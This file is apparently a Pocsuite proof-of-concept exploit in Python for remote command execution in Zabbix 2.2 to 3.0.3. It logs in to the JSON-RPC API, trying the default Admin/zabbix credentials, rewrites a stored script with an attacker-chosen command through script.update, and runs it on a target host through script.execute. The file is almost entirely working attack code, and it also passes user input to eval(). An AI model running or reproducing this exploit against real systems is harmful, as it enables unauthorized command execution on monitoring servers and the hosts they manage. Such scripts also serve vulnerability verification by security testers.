#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import json

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['s0m30ne']
    vulDate = ''
    createDate = '2016-06-15'
    updateDate = '2016-06-15'
    references = ['http://www.seebug.org/vuldb/ssvid-']
    name = 'Zabbix 2.2 - 3.0.3 远程命令执行'
    appPowerLink = 'http://www.zabbix.com/download.php'
    appName = 'Zabbix'
    appVersion = '2.2 - 3.0.3'
    vulType = '远程命令执行'
    desc = '''
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):

        return self._verify()

    def _verify(self):
        result = {}
        if self.login():
            cmd = 'whoami'
            hostid = '10084'

            payload = {
                "jsonrpc": "2.0",
                "method": "script.update",
                "params": {
                    "scriptid": "1",
                    "command": ""+cmd+""
                },
                "auth" : self.auth['result'],
                "id" : 0,
            }

            headers = {
                'content-type': 'application/json',
            }
         
            cmd_upd = req.post("%s/api_jsonrpc.php" % self.url, data = json.dumps(payload), headers = headers)

            payload = {
                "jsonrpc": "2.0",
                "method": "script.execute",
                "params": {
                    "scriptid": "1",
                    "hostid": hostid
                },
                "auth" : self.auth['result'],
                "id" : 0,
            }

            cmd_exe = req.post("%s/api_jsonrpc.php" % self.url, data = json.dumps(payload), headers = headers)
            cmd_exe = cmd_exe.json()
            if cmd_exe["result"]["response"] == 'success':
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Url'] = self.url
                result['VerifyInfo']['Cmd'] = cmd
                result['VerifyInfo']['Value'] = cmd_exe['result']['value']

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

    def login(self):
        if self.params:
            user_info = eval(self.params)
            uname = user_info['username']
            passwd = user_info['password']
        else:
            uname = 'Admin'
            passwd = 'zabbix'

        payload = {
            "jsonrpc" : "2.0",
            "method" : "user.login",
            "params": {
                'user': uname,
                'password': passwd,
            },
            "auth" : None,
            "id" : 0,
        }
        headers = {
            'content-type': 'application/json',
        }
        try:
            auth  = req.post("%s/api_jsonrpc.php" % self.url, data=json.dumps(payload), headers=(headers))
            self.auth = auth.json()
            return True
        except:
            return False

register(TestPOC)